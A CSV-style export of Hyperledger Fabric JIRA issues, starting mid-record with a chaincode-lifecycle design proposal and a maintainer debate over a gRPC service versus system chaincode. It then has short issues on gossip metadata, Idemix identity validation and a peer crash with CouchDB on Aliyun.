            (EndorsementPolicy) : {
                PolicyReference
            }
        ...
        <ChaincodeN>
    <GlobalPolicies>
        |Policy1|
        ...
        |PolicyN|
{noformat}
Where `<xxx>` indicates a group of name `xxx`, `|xxx|` indicates a policy of name `xxx`, and `(xxx)` indicates a value of name `xxx`. Eventually, in the future, the tree may be enhanced to look like this:
{noformat}
<Resources>
    <Chaincodes>
        <Chaincode1>
            (ID) : {
                CodeHash
                InstalledVersion
            }
            (EndorsementPolicy) : {
                PolicyReferenceName
            }
            (InitializationParameters) : {
                PolicyReferenceName
            }
            (Status) : {
                Endorsing bool
                Committing bool
            }
            <Functions>
                (Function1) : {
                    InvocationPolicyReference
                    EndorsementPolicyReference
                }
                ...
                (FunctionN) : {
                    InvocationPolicyReference
                    EndorsementPolicyReference
                }
            <Collections>
                (Collection1) : {
                    ReadPolicyReference
                    EndorsementPolicyReference
                }
                ...
                (CollectionN) : {
                    ReadPolicyReference
                    EndorsementPolicyReference
                }
        ...
        <ChaincodeN>
    <API>
        (APIFunction1) : {
            InvocationPolicyReference
         }
        ...
        (APIFunctionN) : {
            InvocationPolicyReference
         }
    <GlobalPolicies>
        |Policy1|
        ...
        |PolicyN|
{noformat}
However, in the interest of proving out the lifecycle as managed by configuration type transactions quickly, these additional new features will most likely not be included into v1.1 of fabric.

Because this is a configuration tree, each element has an associated {{mod_policy}} which must be satisfied. The default for all of the {{mod_policy}} values will be {{/Channel/Application/Admins}}, requiring a majority of admins of the application network to approve modifying this config tree.

To define a new chaincode, the client will send a reconfiguration transaction which creates a node in the tree under the {{Chaincodes}} group which minimally defines the ID portion of the chaincode (its code hash and version), and its endorsement policy. The peer code will be modified to trigger chaincode lifecycle management internally when this tree is modified.

The client will need the peer to provide a new API to retrieve the resources config tree.  Once the current resources config tree has been retrieved, the client must compute the config update which performs the desired resource reconfiguration (such as deploying a chaincode). Potentially, this new API should also include the ability to simulate a configuration update so that a client may validate its update before submitting it to ordering.

Time permitting, the config tree should be stored in the state database as a flattened tree, with canonical paths for keys, and the config element as value. Time not permitting, a single blob may be stored in the config database, which is less useful for performing MVCC read locks, but, is easy/simple.",,AdnanChoudhury,AshishkumarLakshmanan,binhn,C0rWin,davidkhala,denyeart,jeffgarratt,jiangyaoguo,JonathanLevi,jyellick,kchristidis,mastersingh24,muralisr,Ratnakar,rickr,troyronda,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-7119,,,,,,,,,,,,,,,,,,,,FAB-6543,FAB-7497,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyfd3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,AdnanChoudhury,AshishkumarLakshmanan,binhn,C0rWin,davidkhala,denyeart,jeffgarratt,jiangyaoguo,JonathanLevi,jyellick,kchristidis,mastersingh24,muralisr,Ratnakar,rickr,troyronda,yacovm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Sep/17 5:30 AM;jyellick;I've taken a quick stab at the larger sub-tasks for this item.  Documentation on these could all be improved.

I've also omitted any items which are SDK related, as I think we need to get a concrete implementation, particularly of the new lifecycle API in mind before we can sanely guess what SDK work is required.;;;","20/Sep/17 6:43 AM;denyeart;I've created FAB-6236 subtask as a placeholder item for the various SDKs to support the new style chaincode deployment approach.  Once the design and implementation stabilize to the point where the SDKs can begin work, it can be promoted to a top level task with its own subtasks, one per SDK.;;;","28/Sep/17 10:39 PM;JonathanLevi;Hi, I have just up-voted this, bringing the number of up-votes to 5 (five).;;;","03/Oct/17 4:58 AM;binhn;-1

As I thought about this more, and given what we discussed last week that [~kchristidis] captured in FAB-6398, and from which I have expressed my opinion: chaincode is an asset and it should follow asset materialization process. It is not a configuration. If we think our current endorsement process is inadequate in consensus, then we should fix that. I do see the need for ""asynchronous"" endorsement where it would necessitate multiple steps (workflow) to complete, and which could be expressed in terms of multiple transactions.

The problem is understandable, but the solution proposed here is not desirable IMHO, and we should consider FAB-6398 as a short-term solution.;;;","03/Oct/17 10:42 PM;muralisr;-1 from me too...just want to make sure as this is a big change from user point of view and would be hard to turn back .

My main issue is that user has to do two actions to instantiate a chaincode (1) send a config TX followed by (2) an instantiate TX. The fabric for its part has to maintain a flag to check if instantiate has been called before allowing an Invoke. Currently chaincode instantiate is a TX just like an Invoke.

It could be that I just got used to the 1 TX model and really the proposal with the 2 action model is the correct approach. If everyone agrees with that assessment I'm willing to be convinced. ;;;","04/Oct/17 12:05 AM;jyellick;I would just like to point out, that nothing in the design of the above precludes the possibility of using peers in an endorsement process in the future to collect the necessary signatures as 'endorsements' as suggested in FAB-6398.  Although there are some other deficiencies in the proposal in FAB-6398 which I will reply to directly there, the ultimate problem with FAB-6398 is that as a 'short-term' solution, there is no way to implement it with any security.  To implement FAB-6398 without leaving a security hole requires:

1. A custom ESCC hook to call out to an organization's workflow for deciding whether to endorse
2. Support for asynchronous transactions

neither of which are trivial tasks and I would assume imply completion in 1.3 or beyond.  IMO we need to address the deficiencies in the lifecycle much sooner than this.;;;","04/Nov/17 11:31 AM;jeffgarratt;I wanted to demonstrate possible support for such a function through the existing mechanisms for comparative purposes.  The CR is here https://gerrit.hyperledger.org/r/#/c/15191/

My reasoning is that moving to a GRPC based approach for functional extension would be a move from the current protocol based implementation now in place at the fabric level to an API based approach (which is currently fulfilled by our SDKs).  The associated addition to an SDK based upon the above approach is shown below...

+    def get_resources_config(self, timeout=2):
+        cc_spec= self._get_cc_spec(args=['GetResourcesConfig', self.channel_name])
+        return self._send(cc_spec=cc_spec, type_of_response=common_dot_configtx_pb2.Config, timeout=timeout)

The ramifications of moving to such an API based approach at the fabric level vs the current protocol based approach are many in my opinion and should be considered carefully before deciding to venture down this path.;;;","05/Nov/17 1:04 AM;muralisr;[~jeffgarratt] I think I understand the extension in the CR (I'd have used the RSCC system chaincode but I can see it doing it with the CSCC and peer code too as a keeper of channels and configs).

Its all GRPC based right (Endorser is a grpc service). Any extensions can be provided by single mechanism of SCC calls. What specifically do you mean by `My reasoning is that moving to a GRPC based approach` please ?;;;","05/Nov/17 2:36 AM;yacovm;{quote}(I'd have used the RSCC system chaincode but I can see it doing it with the CSCC and peer code too as a keeper of channels and configs
{quote}
I would like to point out that *there is no really such a thing as CSCC*. It's only a chaincode running inside the peer's process, *initialized using singletons*, uses channels for communication with the endorser code, and then invokes non-instance functions like *peer.GetCurrConfigBlock* to do its work.

 

In fact, in my opinion- LSCC-install, CSCC, VSCC and ESCC and QSCC are actually all simply chaincodes that are doing argument processing and then passing them to the peer.

The only real system chaincodes are the upgrade/instantiate part of LSCC and RSCC, since they read/write to the ledger.

I do not know why the former functions *\{L-install,Q,V,E,C*}SCC were implemented as system chaincodes, as I wasn't present when it was decided or discussed, but had I been asked I'd probably implement ESCC and VSCC as just interfaces that can by dynamically loaded via go plugins, and LSCC, QSCC and CSCC would not be implemented as chaincodes.

 

So, in my opinion - if we need something that involves doing a bunch of ""PutState""s and ""GetState""s or range queries - we can implement that using a chaincode that will run inside the peer (AKA ""system"" chaincode)

However - if we just need something that invokes a function in the peer, such as:
 * Writing to the file system
 * Updating a data structure
 * Doing communication

What do we gain by having it confined in a system chaincode? From my perspective, it is hard to write unit tests for SCCs since they rely so much on singleton access, and also the un-typed arguments (byte arrays) are error-prone by nature.;;;","05/Nov/17 6:39 AM;muralisr;[~yacovm]  The biggest benefit of chaincodes in general is the uniform treatment they afford. Once we say ""chaincode"" one knows what can be done with it, what security aspects are bound to it, how it can be replaced / extended ... etc. Instead of inventing new external entry points for adding services, you simply extend a SCC (or in worst case when a new service is needed, create a new scc) and reap the benefits of the surrounding infrastructure that supports it. We can not predict how users may want to adapt / modify something. But  if they want to do that we can say that the message driven chaincode programming model  affords a uniform, simple mechanism to extend/replace/adapt functionality fairly easily.

As a case in point - I trivially extended the RSCC to have user chaincodes do ACL checks via chaincode-chaincode call... just an example, lets not get diverted or read too much into that.

But more to the point, I think [~jeffgarratt] is making a similar point with his illustration.;;;","06/Nov/17 12:28 AM;denyeart;[~jyellick] As the points above demonstrate, there are naturally pros and cons with the proposal/scc choice vs gRPC choice.  I don't want to block forward progress with -2 on [https://gerrit.hyperledger.org/r/#/c/15107/] , but I do think we need to first (and quickly) get to a decision on the peer config interaction approach. As the owner of this work item, could you net out the pros and cons of each approach in your opinion, and your reasoning for suggesting gRPC approach (in the second-to-last paragraph of Description)?

Perhaps it is possible to meet the main objectives of both sides with a 3rd option.  For example utilize the existing Proposal/ProposalResponse protocol (message driven approach) to keep SDK/peer loosely coupled and leverage existing ProcessProposal handling for signing, authentication, and access control, but have a new HeaderType other then ENDORSER_TRANSACTION (e.g. PEER_API_REQUEST) that would dispatch the request to a non-singleton plugin-capable peer API handler, rather than to a system chaincode. What do you think?;;;","06/Nov/17 11:49 AM;muralisr;[~denyeart]
{quote}Perhaps it is possible to meet the main objectives of both sides with a 3rd option. For example utilize the existing Proposal/ProposalResponse protocol (message driven approach) to keep SDK/peer loosely coupled and leverage existing ProcessProposal handling for signing, authentication, and access control, but have a new HeaderType other then ENDORSER_TRANSACTION (e.g. PEER_API_REQUEST) that would dispatch the request to a non-singleton plugin-capable peer API handler, rather than to a system chaincode.
{quote}
Once we admit the Proposal/ProposalResponse mechanism, it crosses the API boundary and the mechanism that serves the request becomes an implementation detail. In fact having a new PEER_API_REQUEST bleeds that internal implementation detail.

With the chaincode we have one proposal mechanism  - call invoke on the chaincode with parameters to get some response. Just like HTTP, this simple declarative mechanism can be flexibly used in many ways. If we can express new function with that, why would we not simply do that ?;;;","06/Nov/17 4:02 PM;jyellick;> As the owner of this work item, could you net out the pros and cons of each approach in your opinion, and your reasoning for suggesting gRPC approach (in the second-to-last paragraph of Description)?

I will do my best to net out the pros/cons.  I think [~yacovm] actually did a nice job responding in favor of the gRPC interface, as did [~jeffgarratt] and [~muralisr] in favor of chaincode, so I would encourage everyone to read their posts directly (from which I will steal heavily).  As pointed out by others, system chaincode is still fundamentally implemented over gRPC, so we refer to 'gRPC' here, we mean a new gRPC service.


----
*System Chaincode*

Pros for chaincode:
* It's already there.
* The semantics for success/failure of a chaincode invocation already exist, which can make writing a client easier (take Jeff's bdds).
* Chaincode invocation has a security workflow around it.

Cons for chaincode:
* Chaincode is designed to operate on state in a chaincode's DB namespace, and this API would be operating on in memory structures, not the state DB.
* The current state of system chaincode is a bit of a mess.  It's practically impossible to write unit tests against (we achieve code coverage only through unholy non-unit-test-like backflips) and just generally, it is very difficult to write good, modular, testable system chaincode.
* There are already other interfaces, like the event service, the ordering service, and gossip which are not implemented as chaincode.
* The notion of chaincode invocation which has side effects, but which never appears as a transaction (like install) has always been hacky.  In general, system chaincode operations which reach to disk, or in memory structures, seems like a hack.
* The idea that clients can acquire new function without being rebuilt seems to work better in theory than reality.

----
*New gRPC Service*

Pros to gRPC:
* Interface is more explicit for clients and server.
* Peer code is cleaner because there is no manual argument handling / switch statements.
* Trivial to write in a testable modular way.
* Can re-use security structures from ordering and events, for security.

Cons to gRPC:
* Requires clients to learn a new interface.
* No automatic security.

----
*An alternative?*

It seems to me that the biggest complaint about using a gRPC service seems to be that clients must write new logic to invoke it, and the service must re-invent security.

It also seems obvious to me, that not all services are a good fit for chaincode.  Take the ordering APIs, or the event APIs.  Both take a message as input, then produce a (not necessarily bounded) stream as output.  The chaincode API is not designed to accommodate such services, which I don't personally see as a deficiency, but rather a point of design.  These services must implement their own security, and clients must learn how to encode messages which meet this security.

For the orderer, the {{Broadcast}} and {{Deliver}} APIs originally took different inputs.  However, we soon realized that this meant implementing the security twice, so opted to standardize both of these to accept a stream of {{common.Envelope}} messages, so that the security properties could be shared.  I've been discussing with [~wlahti] about security in the new channel event service, and he has been working to use the same {{common.Envelope}} message as input so that he can leverage the same security features like replay prevention etc. that come baked into this message type.  In my discussions with [~yacovm] on the new service, I encouraged him to use the {{common.Envelope}} as the parameter so that it too, could use this same client validation logic. 

If we can standardize the input to these gRPC services to be a {{common.Envelope}}, this seems to solve many of the complaints.  Security is not re-invented, and the clients may use the same message encoding logic for each service (up to the data in the payload).  There is still the question of handling the responses, as I see no obvious way to standardize on the reply type of the services (though maybe it is possible).

If we move towards convention in our non-chaincode gRPC services, does this address the heart of the problem?;;;","06/Nov/17 5:50 PM;yacovm;I must say that I completely don't understand the ""we can re-use security if we use SCC, and if we implement a gRPC service we need to re-implement security"".

Security in fabric has 3 parts [1] and all of them are not handled by SCC or anything related, and thus is implicitly reused:
 * Verification of signatures - this is done by BCCSP
 * Identification of identities, mapping them to principles and validating their existence - this is done by MSP
 * Evaluation of the access rights, this is done by the policies, via passing them a common.SignedData

How can we reuse security if we implement it in SCC?
 SCCs are just a bunch of functions with a big switch-case statement, and in each case- we have a different key that maps to a policy via the aclmgmt package.
 If we add a new function to CSCC or QSCC we need to add another case, and then put there a policy selection for the function name.
 The only ""re-using"" we will get is the little line after the case that actually calls to check the policy. 
 Is that enough re-using to justify ignoring the benefits of the gRPC approach [~jyellick] listed? I don't think so.

 

 

  [1] One can argue that after [https://gerrit.hyperledger.org/r/#/c/15137/] was merged it has another, but it can easily be integrated with the gRPC approach as I have demonstrated in the change set;;;","06/Nov/17 7:11 PM;mastersingh24;So I 100% agree with the comments made by [~jyellick] and [~yacovm]

I will also state that reuse for the sake of reuse is an absolute mistake and I'm not going to list here, but this has and continues to cause us issues in the codebase.

I'd like to break things into several parts:

*1) Chaincode and system chaincode - what are they for?*

In simplest terms, chaincode is Fabric's mechanism for adding smart logic processing.  Without chaincode, Fabric does not really do anything.

It was designed to allow users of Fabric to implement their logic which would be validated and processed by Fabric with Fabric being the core blockchain infrastructure.  Some will also say that chaincode is Fabric's version of smart contracts and while the analogy is fine, chaincode is a bit more powerful than that.

Chaincodeis not a generic plugin mechanism for arbitrary functionality.  While of course you can do whatever you want since you have the full power of programming languages at your disposal, it was intended for processing user-defined transactions.

What is sytem chancode.  Typical chaincode runs out of process from the peer (using Docker today).  The point of system chaincode was to allow people who had well-tested, well-defined chaincode to run it within the peer process itself.  Again, I will assert that it is / was not a generic plugin capability.  The intention was to take standard chaincode and run it in process.  That's it.

*2) Reuse of the chaincode infrastructure as an extension mechanism*

Let's start with how one actually calls chaincode externally.  This is quite simple - call the gRPC ProcessProposal rpc of the [Endorser |https://github.com/hyperledger/fabric/blob/master/protos/peer/peer.proto#L35] service which makes sense because the Fabric transaction model is based on obtaining endorsements for chaincode execution and then submitting them for validation and commit (via the ordering service).

This is not a ""generic"" message passing API as indicated by [~jeffgarratt] and [~muralisr]. It is a very specific service intended to handle the endorser flow. Yes - it uses a ""message passing"" API style, but that is not the same thing as being a generic message passing API entry point to the peer.

I disagreed with implementing the current cscc and qscc functionality this way for exactly these reasons.

Now from code within the peer, one can actually call chaincode a little more directly, but again in the end you are still dealing an endorsement model. I'll continue to argue that SCC is not the proper architecture for system plugins.

*3) Style of APIs*

 [~jeffgarratt] brings up a good point about using message style APIs - although frankly I'm not sure what's so hard about calling a different RPC. To [~jyellick] 's point, we can use the common.Envelope as the message wrapper for the request payloads (for consistency) and we also get the benefit of having a well-defined set of external APIs for specific functions. (FWIW, in v0.6 qscc-like functions were implemented as gRPC RPCs).

*4) Moving forward*

From [~denyeart]
{quote}Also, is the intent to shift the other cscc functions over to gRPC approach, or leave peer config interactions in an inconsistent state going forward?
{quote}
 I believe that we should move a majority of the qscc and cscc interactions to this model.  It's actually trivial to do in any case, but we can decide to defer it until 1.2 or later

 

 

 ;;;","06/Nov/17 11:25 PM;binhn;I am not following why all the discussion on this JIRA item. This is *about chaincode life-cycle*. Please open up another item to discuss new API vs existing API or implementation.

Whichever way we end up, I want to emphasize again (because I am afraid that some of us might not grasp the concept of chaincode correctly):  chaincode is an asset and it should follow asset materialization process; i.e. things about chaincode must be stored in the blockchain and followed the consensus process. In the current implementation, we optimize and store the cc source code off-chain but its evidence on-chain.

 ;;;","06/Nov/17 11:41 PM;denyeart;[~binhn] It is being discussed here since gRPC APIs to support chaincode lifecycle were proposed in second-to-last paragraph of Description here.  The actual work is covered in subtask FAB-6224.  Given the existing discussion thread here, I think it makes sense to keep the discussion here.;;;","07/Nov/17 1:39 AM;muralisr;[~mastersingh24]  
{quote}I will also state that reuse for the sake of reuse is an absolute mistake and I'm not going to list here, but this has and continues to cause us issues in the codebase.
{quote}
I'm not advocating building upon the existing chaincode for reuse sake. On the contrary, I'm saying once implemented in that style, its open to being used in many ways. Just do invoke with args, use cc-2-cc calls, etc. 

Now, one can argue some SCCs will/do not need to be usable in the above sense (but we know sometime use comes later). If we are going to replace such chaincodes as regular gRPC services, then it would make sense to implement these new APIs on top of them. But seems to me we can do that when we do move but for now build the new service on existing chaincode (like [~jeffgarratt] example does) and save on all the costs associated with another new service.;;;","07/Nov/17 1:42 AM;binhn;[~denyeart] I think it's convoluted to group them together. The ramifications of changing this API is big for our user community that must be properly vetted, and I rather not burry it here while the title of this item is about cc life-cycle. 

 ;;;","07/Nov/17 1:49 AM;yacovm;{quote}The ramifications of changing this API is big for our user community
{quote}
What ramification? The user just uses an SDK API, he/she has no idea if the peer has a gRPC service or a system chaincode.
Isn't this part of the reason we made fabric have an SDK? So the peer's API can mutate and the user will not have to re-program its application.;;;","07/Nov/17 5:29 AM;binhn;[~yacovm] who would you think our users are at this level? ;;;","07/Nov/17 5:33 AM;yacovm;Why, it's people who deploy fabric, write smart contracts using chaincodes, and interact with the orderer and the peer using the officially supported SDKs of course;;;","07/Nov/17 5:43 AM;binhn;[~yacovm] just as I thought – no, our users at this level are those who using the current method – they are the SDK developers and those who might have called it directly in their code. We have a number of SDK's now implemented by community at large, and who knows how many using gRPC level directly.;;;","07/Nov/17 7:12 AM;denyeart;[~binhn] I do agree with the last comment to me - a change in overall API direction should be evaluated and vetted in a separate JIRA item, especially given the varying opinions.;;;","07/Nov/17 7:51 AM;kchristidis;+1 to David's comment above and Binh's original comment: the gRPC vs chaincode API change deserves its own JIRA. I suggest we move one step at a time and not couple the main contribution here (i.e. making chaincode lifecycle management config based) with the simultaneous introduction of a gRPC API, especially since we _can_ deliver config-based lifecycle management without it.;;;","07/Nov/17 2:21 PM;jimthematrix;+1 to [~binhn]'s point on the impact of the proposed gRPC API (vs. continuing to use scc), suggest moving FAB-6224 out of this story and making it an enhancement to give the community at large a chance to weigh in. At the minimum we should invite the SDK development teams to comment.

+1 to [~kchristidis] suggestion (and it's [~jeffgarratt]'s point of view as well) to sever the tie b/w the lifecycle changes work by [~jyellick] and what's implemented for FAB-6224. It seems a good engineering practice anyway to tackle one problem at a time. Suggest merging https://gerrit.hyperledger.org/r/#/c/15191/ for now so that Jason's work can be tested end-to-end. And it'll allow us the time and space to debate over the gRPC vs. SCC approach.;;;","07/Nov/17 4:18 PM;denyeart;[~jimthematrix] Note that [https://gerrit.hyperledger.org/r/#/c/15191/] (SCC approach) sits on top of [https://gerrit.hyperledger.org/r/#/c/15107/] (gRPC approach), so if we merge [https://gerrit.hyperledger.org/r/#/c/15191/]  we would get BOTH options implemented.  I think what you intended to say is that a new CR which implements SCC approach only should be merged.  I would agree - that would allow the function to work with existing mechanisms while the gRPC approach is debated.;;;","07/Nov/17 7:41 PM;yacovm;[~denyeart] , [~jimthematrix] note that if we implement the SCC approach and later on switch to the gRPC then the SDK teams would need to implement things twice.;;;","07/Nov/17 9:58 PM;denyeart;[~yacovm] That is understood.  The main objective for now is to get chaincode lifecycle enhancements working quickly and with minimal code changes and risk on both peer and SDK sides, and for that the answer is to extend the SCC pattern.  I suspect there will not be a majority of maintainers ready to vote for a gRPC approach which diverges from existing patterns during 1.1 shutdown.  However if the architectural benefits of gRPC approach are clearly articulated in a separate JIRA Epic, potentially there would be a majority that would vote in favor of switching over all the SCCs in a next release (difficult to know until the ideas and debate brew for some time).  For me personally, going out with an inconsistent story for peer config interactions in 1.1 timeframe is not an appealing answer.;;;","07/Nov/17 10:38 PM;jimthematrix;[~denyeart] +1.

[~yacovm] thanks for pointing that out, to add support in the SDK for the SCC based API the work is pretty straightforward (as we already has APIs built against the CSCC), so if it has to be thrown away it's not a big waste of time.;;;","08/Nov/17 5:43 AM;jeffgarratt;[~yacovm] [~muralisr]

With respect to your first statement Yacov:

_""I would like to point out that there is no really such a thing as CSCC. It's only a chaincode running inside the peer's process, initialized using singletons, uses channels for communication with the endorser code, and then invokes non-instance functions like peer.GetCurrConfigBlock to do its work.""_

Your description seems to align precisely with the following specification document -> [https://github.com/hyperledger-archives/fabric/wiki/System-Chaincode-Specification].  Your declaration that system chaincode designation requires read/write to the ledger does not align with the pre-existing specification.

Your second statement of you weren't present but if you were you would use interfaces vs the message based protocol is analogous to the issue of GRPC vs the protocol discussions I have already raised.  This change in architectural principle from a protocol base interface to API is precisely the one that I believe should not be embarked upon without significant contemplation.

You would have used plugins as well. Plugins were not available in the time frame of these design decisions. In addition, nothing precludes the use of plugins now wrt to implementation. The concept of a message based protocol between reception and dispatch is standardized within the original architecture and the specification clearly denotes this desire to maintain pattern homogeneity internally.;;;","09/Nov/17 10:54 PM;kchristidis;Let's provide some clarity on how we intend to proceed here.

Folks have voiced their opinions on how we should go about implementing the needed APIs, but nowhere do we really say: ""OK, we'll do this.""

To that end I propose the following:
 # We remove the non-chaincode API reference in the second-to-last paragraph of this JIRA description.
 # We create a new sub-task titled ""Implement client-interacting APIs"" (or similar), move over some of the existing discussion there, and agree on the implementation (review-needed, comments, votes). Then the description of the sub-task is updated to reflect consensus. FAB-6224 could be re-purposed/rewritten for this as well.

If you think this is the wrong way to go, propose your own set of steps. I'm not really married to my proposal above – all I care about is that we address the fact that we do not _explicitly_ state that ""we will do X"" w/r/t implementation.

We'll need to start doing a better job separating problem description from proposed implementation, so that we won't get caught up in a similar process again in the future. Work on a better decision/release process is underway.

And it should be noted that my current proposal leaves loopholes. (For instance, should you be allowed to modify a JIRA description that has already been voted on?) But for now, let's figure out a way to clarify the implementation related to this JIRA.;;;","10/Nov/17 6:08 AM;denyeart;[~kchristidis] I agree.

I propose that [~jyellick] update the Description and create the subtask for ""Implement client-interacting peer config APIs"" (or similar), so that nothing gets lost in translation.  And sure, for lack of a better voting mechanism, all in favor can upvote it in the subtask.  [~aambati] has freed up and is starting to look at what an extension of Jeff's sample impl would look like (Jason and Yacov and Jeff are aware).;;;","10/Nov/17 6:35 AM;jyellick;[~denyeart] [~kchristidis] I've done as suggested, editing the main text of this issue to be more agnostic about the API implementation, and created a new sub-task https://jira.hyperledger.org/browse/FAB-6951 for further discussion.;;;","09/Dec/17 1:25 AM;rickr;If an SDK creates the update for the chaincode resource there are many parts of the group/tree  where mod policies must be specified.  How flexible would the API need to be to allow the application to specify these ?  Would for example specifying a single mod policy applied to all levels be too limiting ?   Allowing every specific mod policy to be specified too cumbersome for typical use case?;;;","09/Dec/17 1:39 AM;rickr;It seems also at any point the SDK would need to allow overwrite or not option on mod policies. In case of not being there use the mod policy specified or if the already present overwrite / use existing.;;;","09/Dec/17 1:53 AM;rickr;The mod policies are referenced to places in a _tree_ (/Channel/Application/Writers) can the SDKs just assume the application will know where and what these are ?

 ;;;","09/Dec/17 5:06 AM;jyellick;[~rickr]

With respect to the {{mod_policy}} fields in the resources config, I would suggest that the SDKs begin simply. There is a {{mod_policy}} that will be present for the {{Chaincodes}} group (already existing in the config). If you are creating a new item which requires a {{mod_policy}} be set, simply set it to the value from the {{Chaincodes}} group. If the item is not new, simply leave the {{mod_policy}} alone.

If you wanted to expose the {{mod_policy}} as an option,then I would think a single string would be the logical place to start. Let's keep it simple until we learn more about how users will typically want to configure their system?;;;","04/Jan/18 3:00 AM;jyellick;This approach has been abandoned.  Marked Done / WON'T FIX.;;;"
gradually migrate gossip stateInfo metadata to proto structures,FAB-6043,20624,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,06/Sep/17 4:50 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,13/Sep/17 12:36 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,"In gossip we use StateInfo messages to convey channel related metadata like block height to peers, in order to build channel membership.
{code}
message StateInfo {
    bytes metadata     = 1;
    PeerTime timestamp = 2;
    bytes pki_id       = 3;

    // channel_MAC is an authentication code that proves
    // that the peer that sent this message knows
    // the name of the channel.
    bytes channel_MAC  = 4;
}
{code}

The metadata is a marshalled struct and therefore isn't extendable.

I propose to add another field (properties? attributes?) that would be a proto message, and:
* Populate the ledger height in the new field as well as in the old metadata field so that peers of v1.0.x would work with peers of version v1.1 in the following fashion:
** When evaluating a StateInfo message, first look at the new field. If it's nil - look at the old field (metadata). If it's a zero length slice - the message would be deemed invalid.
* At some point in the future we would eventually deprecate the metadata field.

[~C0rWin] [~mastersingh24]",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfdb:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Sep/17 7:22 PM;yacovm;https://gerrit.hyperledger.org/r/#/c/13233/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement Identity.Validate() with cryptographic verification of an Idemix Credential for Idemix MSP,FAB-6044,20625,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mdr,dubovitskaya,dubovitskaya,06/Sep/17 5:13 PM,05/Dec/18 5:49 AM,28/Oct/23 3:00 AM,18/Oct/17 11:39 PM,,,,,,fabric-crypto,,,,,,0,msp,,,,,,"Identity.Validate() currently requires cryptographic validation of a membership certificate. 

Due to the nature of zero-knowledge proofs, an Idemix signature also 'contains' the proof of certificate validity, whereas with x509 the certificate is individually verified in Validate() and a signature is verified separately by calling a signature verification algorithm (without re-verifying the certificate). When first calling Validate() and later verifying signatures with an Identity, both the msp-impl and idemixmsp give the guarantee that the messages were signed by members that were issued a credential.

However, if you only call Identity.Validate() without later verifying a signature produced by this identity, the behaviour is currently different. 

While we are not aware of the scenarios when a separate identity validation is required (without verifying a signature) and calling Validate() and then Verify() for Idemix Identity will result into overhead of verifying two zero-knowledge proofs instead of one, we were requested to implement Validate() with cryptographic verification so that the behaviour and guarantees of msp-impl and idemixmsp are the same. ",,dubovitskaya,mdr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,86400,86400,,0%,86400,86400,,,,,,,,,,FABC-630,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2005,,,,,,,,,"1|hzyfdj:",,,,,,,,,,,,,,,,,,,,,,,dubovitskaya,mdr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Oct/17 5:45 PM;mdr;CR: https://gerrit.hyperledger.org/r/#/c/13671/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peer will crash in Aliyun environment with CouchDB configured as statedb,FAB-6045,20626,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,,xuanyue202,xuanyue202,06/Sep/17 5:36 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,27/Nov/17 11:24 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"We are using Hyperledger Fabric to do commercial customer project in China. And we found a very severe problem that Fabric cannot run in the largest IaaS cloud platform Aliyun with CouchDB configured as statedb. We tried different OS (from centos to ubuntu) and OS version and different docker-compose version (even the one ship with composer). The crash log is attached. We can provide VM environment for testing & debugging if needed. It blocks part of our work.

 

Peer log is too long to place here. I uploaded it to a Box folder which can be access from [https://ibm.box.com/s/7nwrncxjztktslf9s3yx7jtffrhonv1s]

 ","os: Ubuntu 16.04.2 LTS

kernel: 4.4.0-85-generic

cpu: Intel(R) Xeon(R) CPU E5-2680 v3 @ 2.50GHz 8 cores

mem: 16G

disk: 100G

 ",denyeart,mastersingh24,xuanyue202,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5822,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx0jz:",,,,,,,,,,,,,,,,,,,,,,,denyeart,mastersingh24,xuanyue202,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Sep/17 11:39 AM;denyeart;I see no  evidence of CouchDB problems in the log.  Do you suspect the problem is related to CouchDB for some reason?  Can the problem be reproduced when using leveldb as state database? 

Please enable trace (e.g. CORE_LOGGING_LEVEL=DEBUG) and re-post log.;;;","08/Sep/17 7:12 PM;xuanyue202;Hi David, I reached the conclusion by controlling variable. As long as we switched from couchdb to leveldb, fabric can work. No other configuration changes. So we are sure this crash is caused by the adoption of couchdb - But not necessarily by couchdb itself.;;;","01/Oct/17 10:25 PM;mastersingh24;Try setting the following env variable:

GODEBUG=""netdns=go"" when starting the peer;;;","17/Oct/17 12:22 AM;denyeart;[~xuanyue202] Just checking back.  Were you able to get things working?  If not, please provide debug log requested, peer log with CORE_LOGGING_LEVEL=DEBUG  and GODEBUG=""netdns=go"" .

